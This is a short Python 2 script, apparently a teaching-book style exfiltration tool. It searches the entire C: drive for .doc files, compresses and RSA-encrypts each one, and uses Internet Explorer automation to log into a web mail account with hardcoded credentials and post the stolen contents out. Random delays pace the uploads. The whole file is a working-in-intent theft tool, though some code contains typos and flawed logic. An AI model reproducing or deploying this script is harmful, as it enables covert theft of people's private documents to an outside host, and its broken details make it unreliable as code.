__author__ = 'DarkWing'

import win32com.client
import os
import fnmatch
import time
import random
import zlib

from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP

doc_type = ".doc"
username = "mail_account"
password = "password"

public_key = ""

def wait_for_browser(browser):
    while browser.ReadyState != 4 and browser.ReadyState != "complete":
        time.sleep(0.1)

    return

def encrypt_string(plaintext):
    chunk_size = 256
    print "Compressing: %d bytes" %len(plaintext)
    plaintext = zlib.compress(plaintext)

    print "Encrypting %d bytes" %len(plaintext)

    rsakey = RSA.importKey(public_key)
    rsakey = PKCS1_OAEP.new(rsakey)

    encryped = ""
    offset = 0

    while offset < len(plaintext):
        chunk = plaintext[offset:offset+chunk_size]

        if len(chunk) % chunk_size != 0:
            chunk += " " * (chunk_size - len(chunk))

        encryped += rsakey.encrypt(chunk)
        offset += chunk_size

    encryped = encryped.encode("base64")

    print "Base64 encodes crypto: %d" %len(encryped)

    return encryped

def encrypt_post(filename):
    fd = open(filename,"rb")
    contents = fd.read()
    fd.close()

    encrypted_title = encrypt_string(filename)
    encrypt_body = encrypt_string(contents)

    return encrypted_title,encrypt_body

def random_sleep():
    time.sleep(random.randint(5,10))
    return

def login_to_mail(ie):
    full_doc = ie.Document.all

    for i in full_doc:
        if i.id == "accname":
            i.setAttribute("value",username)
        elif i.id == "accpwd":
            i.setAttribute("value",password)

    random_sleep()

    ie.Document.forms[0].submit()

    random_sleep()

    wait_for_browser(ie)

    return

def post_to_mail(ie,title,post):
    full_doc = ie.Document.all

    for i in full_doc:
        if i.name == "subject":
            i.setAttribute("value",title)
            title_box = i
            i.focus()
        elif i.name == "content":
            i.setAttribute("innerHtml",post)
            print "Set text area"
            i.focus()
        elif i.name == "mail_post":
            print "Found post button"
            post_form = i
            i.focus()

    random_sleep()
    title_box.focus()
    random_sleep()

    post_form.chlidren[0].click()
    wait_for_browser(ie)

    random_sleep()

    return

def exfiltrate(document_path):
    ie = win32com.client.Dispatch("InternetExplorer.Applications")
    ie.Visible = 1

    ie.Navigate("http://www.mail.com/login")
    wait_for_browser(ie)

    print "Logging in..."
    login_to_mail(ie)
    print "logged in...navigating"

    ie.Navigate("http://www.mail.com/new/text")
    wait_for_browser(ie)

    title,body = encrypt_post(document_path)

    print "Creating new post..."
    post_to_mail(ie,title,body)
    print "Posted!"

    ie.Quit()
    ie = None

    return

for parent,directories,filenames in os.walk("C:\\"):
    for filename in fnmatch.filter(filenames,"*%s" %doc_type):
        document_path = os.path.join(parent,filename)
        print "Found: %s" %document_path
        exfiltrate(document_path)
        raw_input("Continue?")

